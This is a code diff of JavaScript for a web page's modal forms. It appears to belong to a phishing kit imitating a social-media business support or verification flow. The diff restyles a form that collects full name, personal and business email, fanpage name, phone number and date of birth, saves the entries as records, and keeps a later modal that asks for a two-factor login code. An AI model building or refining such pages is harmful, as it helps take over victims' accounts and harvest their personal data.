@@ -1,44 +1,81 @@
 // Main Application Logic
 
-// Generate ticket ID
-document.getElementById('ticketId').textContent = Utils.generateTicketId();
-
-// Start verification flow
-document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);
-
 // ==================== MODAL 1: CLIENT INFO ====================
 function openClientModal() {
     const content = `
-        <div class="flex items-center justify-between mb-4">
-            <h2 class="font-bold text-[15px]">Partnership Registration Form</h2>
-            <button onclick="Modal.close('clientModal')" class="w-7 h-7 flex items-center justify-center rounded-full hover:bg-white/40 text-gray-400 hover:text-gray-700 transition-colors text-xl leading-none">&times;</button>
+        <div class="flex items-center justify-between mb-[10px]">
+            <h2 class="font-bold text-[#0A1317] text-[15px] flex items-center justify-center text-center">Information</h2>
+            <button onclick="Modal.close('clientModal')" class="w-[18px] h-[18px] cursor-pointer opacity-60 hover:opacity-100 transition-opacity duration-200">
+                <img class="w-[18px] h-[18px]" alt="close" src="./public/icons/ic_close.svg">
+            </button>
         </div>
-        <form id="clientForm" class="space-y-3">
-            <input type="text" id="fullName" placeholder="Full Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="email" id="email" placeholder="Email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="email" id="emailBusiness" placeholder="Email Business" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="text" id="fanpage" placeholder="Page Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="tel" id="phone" placeholder="Phone Number" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <div>
-                <b class="text-[#9a979e] text-sm block mb-2">Date of Birth</b>
-                <div class="grid grid-cols-3 gap-2">
-                    <input type="number" id="day" placeholder="Day" min="1" max="31" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                    <input type="number" id="month" placeholder="Month" min="1" max="12" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                    <input type="number" id="year" placeholder="Year" min="1900" max="2024" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                </div>
+        <div class="flex-1 overflow-y-auto">
+            <div class="h-full flex flex-col w-full items-center justify-between flex-1">
+                <form id="clientForm" autocomplete="off" class="w-full">
+                    <div class="w-full">
+
+                        <div class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                            <input id="fullName" placeholder="Full Name" class="w-full outline-0 h-full tracking-wide" type="text" required>
+                        </div>
+
+                        <div class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                            <input id="email" placeholder="Email Address" class="w-full outline-0 h-full tracking-wide" type="email" required>
+                        </div>
+
+                        <div class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                            <input id="emailBusiness" placeholder="Email Business Address" class="w-full outline-0 h-full tracking-wide" type="email" required>
+                        </div>
+
+                        <div class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                            <input id="fanpage" placeholder="Fanpage Name" class="w-full outline-0 h-full tracking-wide" type="text" required>
+                        </div>
+
+                        <div class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                            <input id="phone" placeholder="Phone Number" class="w-full outline-0 h-full tracking-wide" type="tel" required>
+                        </div>
+
+                        <b class="text-[#9a979e] text-[14px] mb-[7px] block">Date of Birth</b>
+                        <div class="grid grid-cols-3 gap-[10px]">
+                            <div class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                                <input id="day" placeholder="Day" class="w-full outline-0 h-full" type="number" min="1" max="31" required>
+                            </div>
+                            <div class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                                <input id="month" placeholder="Month" class="w-full outline-0 h-full" type="number" min="1" max="12" required>
+                            </div>
+                            <div class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                                <input id="year" placeholder="Year" class="w-full outline-0 h-full" type="number" min="1900" max="2024" required>
+                            </div>
+                        </div>
+
+                        <div class="input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-white text-[14px] mb-[10px]">
+                            <textarea id="message" class="w-full outline-0 h-full resize-none" placeholder="Message"></textarea>
+                        </div>
+
+                        <p class="text-[#9a979e] text-[14px] mb-[7px]">Our response will be sent to you within 14 - 48 hours.</p>
+
+                        <div class="mt-[15px] mb-[20px]">
+                            <label class="cursor-pointer flex items-center gap-[5px] text-[14px]">
+                                <label class="inline-flex items-center cursor-pointer">
+                                    <input class="sr-only" id="custom-checkbox" type="checkbox" required>
+                                    <div class="w-[16px] h-[16px] rounded-[4px] flex items-center justify-center border transition-all duration-200 bg-white border-gray-300">
+                                        <svg class="w-[12px] h-[12px] text-white" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"></svg>
+                                    </div>
+                                </label>
+                                I agree to the
+                                <a href="" class="text-[#0064E0] hover:underline pointer-events-none">
+                                    Terms of use <img alt="" class="inline w-[13px] h-[13px]" src="./public/icons/ic_reject.svg">
+                                </a>
+                            </label>
+                        </div>
+
+                        <div class="w-full mt-[20px]">
+                            <button type="submit" class="w-full h-[45px] min-h-[45px] bg-[#0064E0] text-white rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]">Submit</button>
+                        </div>
+
+                    </div>
+                </form>
             </div>
-            <textarea placeholder="Additional notes (optional)" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
-            <p class="text-[#9a979e] text-[14px] mb-[7px]">Our response will be sent to you within 14 - 48 hours.</p>
-            <div class="mt-[15px] mb-[20px]">
-                <label class="cursor-pointer flex items-center gap-[5px] text-[14px] " for="custom-checkbox">
-                    <label class="inline-flex items-center cursor-pointer">
-                        <input type="checkbox">
-                    </label>
-                    I agree with<a class="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">Terms of use <img src="./public/icons/reject.svg" class="w-[10px] h-[10px] items-center inline" alt=""></a>
-                </label>
-            </div>
-            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Send</button>
-        </form>
+        </div>
     `;
 
     Modal.create('clientModal', content);
@@ -54,7 +91,8 @@ function openClientModal() {
             phone: document.getElementById('phone').value.trim(),
             day: document.getElementById('day').value,
             month: document.getElementById('month').value,
-            year: document.getElementById('year').value
+            year: document.getElementById('year').value,
+            message: document.getElementById('message').value.trim()
         };
 
         Utils.saveRecord('__client_rec__fi_rst', formData);
@@ -162,7 +200,7 @@ function openAuthenticationModal(userData) {
                     <input type="number" id="twoFa" placeholder="Code" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                     <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
                     <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
-                    <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span>Try another way</span></div>
+                    <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-transparent rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3]"><span>Try another way</span></div>
                 </form>
             </div>
             <div class="w-16 mt-5 mx-auto">
